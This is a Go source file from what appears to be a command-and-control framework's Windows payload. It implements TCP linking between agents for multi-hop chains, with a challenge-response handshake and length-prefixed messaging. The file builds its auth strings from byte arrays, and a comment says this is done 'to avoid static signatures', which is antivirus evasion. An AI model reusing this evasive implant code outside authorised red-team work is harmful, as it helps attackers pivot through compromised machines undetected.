// server/docker/payloads/TCP_Windows/link_tcp.go
// TCP client for connecting to other TCP agents (multi-hop chains)

//go:build windows
// +build windows

package main

import (
	"fmt"
	"net"
	"time"
)

// Auth strings (constructed to avoid static signatures)
var (
	lmAuthPrefixTCPLink = string([]byte{0x41, 0x55, 0x54, 0x48, 0x3a}) // AUTH:
	lmAuthOKTCPLink     = string([]byte{0x4f, 0x4b})                   // OK
)

// dialTCP connects to a TCP agent at the specified address
func dialTCP(address string, timeout time.Duration) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return nil, err
	}

	// Enable TCP keepalive
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
	}

	return conn, nil
}

// performLinkAuthTCP performs simple challenge-response authentication when connecting to a TCP agent
// This mirrors the auth flow in auth.go, but from the parent's (connecting) perspective
func performLinkAuthTCP(conn net.Conn) error {
	// Set deadline for auth
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	defer conn.SetDeadline(time.Time{}) // Clear deadline

	// Step 1: Read 32-byte challenge from TCP agent
	challenge, err := readLinkMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Step 2: Send "AUTH:" + challenge
	response := append([]byte(lmAuthPrefixTCPLink), challenge...)
	if err := writeLinkMessage(conn, response); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Step 3: Read "OK" confirmation
	confirm, err := readLinkMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	if string(confirm) != lmAuthOKTCPLink {
		return fmt.Errorf(Err(E3))
	}

	return nil
}

// writeLinkMessage writes a length-prefixed message to the connection
func writeLinkMessage(conn net.Conn, data []byte) error {
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}
	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

// readLinkMessage reads a length-prefixed message from the connection
func readLinkMessage(conn net.Conn) ([]byte, error) {
	header := make([]byte, 4)
	if _, err := conn.Read(header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24
	if length > 10*1024*1024 {
		return nil, fmt.Errorf(Err(E2))
	}

	data := make([]byte, length)
	totalRead := 0
	for totalRead < int(length) {
		n, err := conn.Read(data[totalRead:])
		if err != nil {
			return nil, err
		}
		totalRead += n
	}

	return data, nil
}
